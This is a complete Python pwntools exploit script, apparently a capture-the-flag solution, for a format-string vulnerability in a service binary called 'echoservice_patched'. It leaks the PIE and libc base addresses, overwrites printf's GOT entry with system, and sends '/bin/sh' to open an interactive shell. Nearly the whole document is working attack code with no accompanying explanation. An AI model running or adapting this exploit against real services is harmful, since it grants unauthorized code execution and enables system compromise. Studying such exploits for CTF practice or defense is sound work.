#!/usr/bin/env python3
from pwn import *

# Read binaries
elf = context.binary = ELF("./echoservice_patched")
libc = ELF("./libc-2.28.so")

PORT = 4444

# For GDB debugging
def start():
    if args.LOCAL:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript='continue')
        return process(elf.path)
    else:
        l = listen(PORT)
        _ = l.wait_for_connection()
        return l


p = start()

# Calculate offset from 27th value in stack to pie base without aslr
offset = 0x5555555552bd - 0x555555554000

payload = b"%27$p"
p.sendline(payload)
elf_leak = int(p.recvline(), 16)

elf.address = elf_leak - offset

log.success(f"PIE base: {hex(elf.address)}")

# Get value of printf in got
printf_got = elf.got['printf']

payload = b"%7$s|END"
payload += p64(printf_got)

p.sendline(payload)
PRINTF = unpack(p.recvuntil(b"|END", drop=True), 'all')

log.success(f"PRINTF@LIBC: {hex(PRINTF)}")

# Get libc base
libc.address = PRINTF - libc.sym['printf']

log.success(f"LIBC base: {hex(libc.address)}")

# Overwrite printf with system
writes = {printf_got: libc.sym['system']}

payload = fmtstr_payload(6, writes, write_size='short')

p.sendline(payload)
p.clean()
p.sendline(b"/bin/sh")  # Run shell with system

log.success("Enjoy your shell :)")
p.interactive()
